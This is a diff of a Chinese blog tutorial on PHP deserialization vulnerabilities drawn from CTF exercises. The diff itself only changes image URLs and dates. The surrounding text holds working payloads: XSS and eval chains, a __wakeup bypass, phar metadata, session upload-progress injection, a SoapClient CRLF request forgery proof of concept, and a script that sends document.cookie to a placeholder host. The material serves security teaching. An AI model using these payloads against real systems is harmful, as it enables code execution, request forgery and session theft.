@@ -27,26 +27,26 @@
 <meta property="og:site_name" content="kawhi&#39;s Blog">
 <meta property="og:description" content="前言最近在buu刷题，遇到到了一些关于反序列化的题目，这里做一个总结。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://img.kawhi.xyz/image-20200711120132680.png">
-<meta property="og:image" content="http://img.kawhi.xyz/image-20200711121735182.png">
-<meta property="og:image" content="http://img.kawhi.xyz/image-20200711123022767.png">
-<meta property="og:image" content="http://img.kawhi.xyz/image-20200711123529023.png">
-<meta property="og:image" content="http://img.kawhi.xyz/image-20200711220816401.png">
-<meta property="og:image" content="http://img.kawhi.xyz/image-20200711232201316.png">
-<meta property="og:image" content="http://img.kawhi.xyz/image-20200711232430900.png">
-<meta property="og:image" content="http://img.kawhi.xyz/image-20200711211409836.png">
-<meta property="og:image" content="http://img.kawhi.xyz/image-20200711211709331.png">
-<meta property="og:image" content="http://img.kawhi.xyz/image-20200711213050621.png">
-<meta property="og:image" content="http://img.kawhi.xyz/image-20200711213202557.png">
-<meta property="og:image" content="http://img.kawhi.xyz/image-20200712162931204.png">
-<meta property="og:image" content="http://img.kawhi.xyz/image-20200712164137201.png">
-<meta property="og:image" content="http://img.kawhi.xyz/image-20200711143646347.png">
-<meta property="og:image" content="http://img.kawhi.xyz/image-20200711143829700.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711120132680.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711121735182.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711123022767.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711123529023.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711220816401.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711232201316.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711232430900.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711211409836.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711211709331.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711213050621.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711213202557.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200712162931204.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200712164137201.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711143646347.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711143829700.png">
 <meta property="article:published_time" content="2020-05-11T16:00:00.000Z">
-<meta property="article:modified_time" content="2020-10-25T02:29:07.768Z">
+<meta property="article:modified_time" content="2020-12-06T08:27:07.081Z">
 <meta property="article:author" content="kawhi">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://img.kawhi.xyz/image-20200711120132680.png">
+<meta name="twitter:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711120132680.png">
 
 <link rel="canonical" href="https://www.getflag.cn/2020/05/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
 
@@ -240,7 +240,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-25 10:29:07" itemprop="dateModified" datetime="2020-10-25T10:29:07+08:00">2020-10-25</time>
+                <time title="修改时间：2020-12-06 16:27:07" itemprop="dateModified" datetime="2020-12-06T16:27:07+08:00">2020-12-06</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -284,7 +284,7 @@
 <p>序列化和反序列化本身没有问题，但是如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。</p>
 <p>我们通常把<strong>字符串/数组/对象</strong>进行序列化，然后再反序列化被序列化的<strong>字符串/数组/对象</strong>。</p>
 <p>首先举一个简单的例子</p>
-<img src="http://img.kawhi.xyz/image-20200711120132680.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711120132680.png" style="high:80%;width:80%;" />
 
 <p><strong>分析一下序列化之后的含义</strong></p>
 <p><strong>字符串：</strong></p>
@@ -297,7 +297,7 @@
 <p><code>class ABC&#123;public $name=&quot;kawhi&quot; ;&#125;</code>创建对象后，序列化后的结果是<code>O:3:&quot;ABC&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;kawhi&quot;;&#125;</code></p>
 <p>其中O表示存储的对象(object类型)，3代表对象名称有3个字符，即ABC，1表示有一个值，s代表string类型，4代表字符串长度，name代表字符串名称，依此类推。</p>
 <p>如果在被序列化的对象中加入一些恶意的代码，如XSS弹窗，那么在进行反序列化的时候就相当于解码操作，然后会自动执行。</p>
-<img src="http://img.kawhi.xyz/image-20200711121735182.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711121735182.png" style="high:80%;width:80%;" />
 
 <h2 id="结合魔法函数构造poc链"><a href="#结合魔法函数构造poc链" class="headerlink" title="结合魔法函数构造poc链"></a><strong>结合魔法函数构造poc链</strong></h2><p>通常来说有一些PHP的魔法函数会导致反序列化漏洞，如：</p>
 <p><code>__construct</code> 当一个对象创建时自动调用</p>
@@ -324,7 +324,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> A();</span><br><span class="line">$c = serialize($c);</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br></pre></td></tr></table></figure>
 
 <p>输出<code>O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:28:&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;;&#125;</code></p>
-<img src="http://img.kawhi.xyz/image-20200711123022767.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711123022767.png" style="high:80%;width:80%;" />
 
 <p>可以看到直接导致xss攻击，如果<code>__wakeup</code>中不是<code>echo()</code>，而是<code>eval()</code>那么就是任意代码执行，危害就更大了。</p>
 <p>把<code>echo()</code>修改为<code>eval()</code>，如下：</p>
@@ -332,7 +332,7 @@
 
 <p>传入<code>O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code></p>
 <p>可以看到已经成功执行php代码。</p>
-<img src="http://img.kawhi.xyz/image-20200711123529023.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711123529023.png" style="high:80%;width:80%;" />
 
 <h2 id="一些知识点"><a href="#一些知识点" class="headerlink" title="一些知识点"></a><strong>一些知识点</strong></h2><h3 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a><strong>wakeup绕过</strong></h3><p>这是在攻防世界刷到的一题，通过这道题认识怎么绕过。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -344,7 +344,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line">$a = serialize($a).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$a = str_replace(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>,$a);</span><br><span class="line">$a  =  str_replace(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,$a);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($a);</span><br></pre></td></tr></table></figure>
 
 <h3 id="私有属性绕过"><a href="#私有属性绕过" class="headerlink" title="私有属性绕过"></a><strong>私有属性绕过</strong></h3><p>首先来看看这样一段代码</p>
-<img src="http://img.kawhi.xyz/image-20200711220816401.png" style="high:70%;width:70%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711220816401.png" style="high:70%;width:70%;" />
 
 <p>这里要注意</p>
 <ul>
@@ -377,13 +377,13 @@
 <p>漏洞产生的原因</p>
 <p>使用<code>Phar://</code>伪协议去读取Phar文件时候，文件会被当做phar对象，meta-data部分会被反序列化。phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在<strong>文件系统函数</strong>参数可控的情况下，配合<strong>phar://伪协议</strong>，可以不依赖<code>unserialize()</code>直接进行反序列化操作。</p>
 <p>这里贴一下受影响的文件系统函数列表。</p>
-<img src="http://img.kawhi.xyz/image-20200711232201316.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711232201316.png" style="high:80%;width:80%;" />
 
 <p>举一个小栗子：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成phar 文件的格式</span></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>这里的话需要把php.ini的;phar.readonly = On改为phar.readonly = Off，否则无法生成phar文件。</p>
-<img src="http://img.kawhi.xyz/image-20200711232430900.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711232430900.png" style="high:80%;width:80%;" />
 
 <p>可以看到已经成功输出字符。当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，极大的拓展了攻击面。</p>
 <p><strong>phar的伪造</strong></p>
@@ -436,13 +436,13 @@
 
 <p>考虑到可能是序列化引擎不同导致的session反序列漏洞</p>
 <p>然后查看一下phpinfo的信息</p>
-<img src="http://img.kawhi.xyz/image-20200711211409836.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711211409836.png" style="high:80%;width:80%;" />
 
 <p>发现存储和读取session时用到的处理器引擎不一样。</p>
 <p>现在有个问题，session是怎么传进去的呢，平时都是有个<code>$_SESSION=$_GET[&#39;a&#39;]</code>，通过参数a传进去，本题没有$_SESSION进行变量赋值，这种情况我们可以用php文件上传进度来解决。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当在php.ini中设置session.upload_progress.enabled = On的时候，PHP将能够跟踪上传单个文件的上传进度。当上传正在进行时，以及在将与session.upload_progress.name INI设置相同的名称的变量设置为POST时，上传进度将在$ _SESSION超全局中可用。</span><br></pre></td></tr></table></figure>
 
-<img src="http://img.kawhi.xyz/image-20200711211709331.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711211709331.png" style="high:80%;width:80%;" />
 
 <p>session.upload_progress.enabled刚好都是开启的。我们启用了该配置项后，POST一个和session.upload_progress.name同名变量的时候，PHP会将文件名保存在$_SESSION中。</p>
 <p>于是这里我们构造表单</p>
@@ -464,23 +464,23 @@
 
 <p>然后得到文件名Here_1s_7he_fl4g_buT_You_Cannot_see.php</p>
 <p>得到文件名之后还得查看路径，在phpinfo里面查看</p>
-<img src="http://img.kawhi.xyz/image-20200711213050621.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711213050621.png" style="high:80%;width:80%;" />
 
 <p>得到路径之后改下payload即可得到flag。</p>
-<img src="http://img.kawhi.xyz/image-20200711213202557.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711213202557.png" style="high:80%;width:80%;" />
 
 <h3 id="反序列化原生类的利用"><a href="#反序列化原生类的利用" class="headerlink" title="反序列化原生类的利用"></a><strong>反序列化原生类的利用</strong></h3><p>什么情况需要考虑原生类呢，题目找不到POP链的时候可以考虑PHP原生类。</p>
 <h4 id="call的原生类"><a href="#call的原生类" class="headerlink" title="__call的原生类"></a>__call的原生类</h4><p>SoapClient算是目前被比较好用的一个内置类，php5、7都存在此类。正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法。</p>
 <p>先来看这样一段代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;kawhi&#x27;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://134.175.168.213:5555/path&#x27;</span>));</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;not_exists_function();</span><br></pre></td></tr></table></figure>
 
-<img src="http://img.kawhi.xyz/image-20200712162931204.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200712162931204.png" style="high:80%;width:80%;" />
 
 <p>可以看出，SOAPAction处可控，这里要注意的是如果Content-Type在SOAPAction的上面，就无法控制Content-Type，也就不能控制POST的数据，这里的局限性就是仅限于http/https协议，但是这里http头部还存在crlf漏洞，可以把<code>\r\n</code>即<code>%0d%0a</code>注入到SOAPAction，POST请求的header就可以被控制。</p>
 <p>这里贴一下wupco师傅的poc</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">&quot;http://134.175.168.213:5555/&quot;</span>;</span><br><span class="line">$post_string = <span class="string">&#x27;data=kawhi&#x27;</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,$headers).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)strlen($post_string).<span class="string">&#x27;^^^^&#x27;</span>.$post_string,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,$a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($a);</span><br><span class="line">$c = unserialize($a);</span><br><span class="line">$c-&gt;not_exists_function();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<img src="http://img.kawhi.xyz/image-20200712164137201.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200712164137201.png" style="high:80%;width:80%;" />
 
 <p>从上图可以看出使用SoapClient反序列化+CRLF<strong>可以生成任意POST请求</strong>。</p>
 <p>这里有一道buu的题bestphp’s revenge可以结合SoapClient和上面的session反序列化一起理解，这里有个writeup写的很详细，这里不再赘述。</p>
@@ -501,7 +501,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>可以看到已经成功弹窗</p>
-<img src="http://img.kawhi.xyz/image-20200711143646347.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711143646347.png" style="high:80%;width:80%;" />
 
 <p><strong>Exception</strong></p>
 <p>适用于php5、7版本</p>
@@ -513,7 +513,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>同样成功弹窗。</p>
-<img src="http://img.kawhi.xyz/image-20200711143829700.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711143829700.png" style="high:80%;width:80%;" />
 
 <p>本题payload为</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = serialize(<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;window.location.href=&#x27;IP&#x27;+document.cookie&lt;/script&gt;&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
